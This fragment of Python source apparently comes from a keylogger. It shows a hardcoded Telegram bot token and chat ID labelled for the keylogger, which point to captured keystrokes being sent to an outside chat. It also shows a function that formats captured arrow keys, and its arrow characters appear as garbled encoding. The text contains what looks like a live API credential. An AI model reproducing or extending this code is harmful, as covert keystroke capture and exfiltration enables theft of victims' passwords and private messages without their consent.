...
if config:
    ...
    KEYLOGGER_BOT_API_KEY = "8192551934:AAHvtq67d_HNdN5P4PsGzcjVl5j1kkBzFgc"
    KEYLOGGER_CHAT_ID = "7938676762"
...
def process_special_keys(text):
    ...
    text = re.sub(r'\[left\]', '[â†]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[right\]', '[â†’]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[up\]', '[â†‘]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[down\]', '[â†“]', text, flags=re.IGNORECASE)
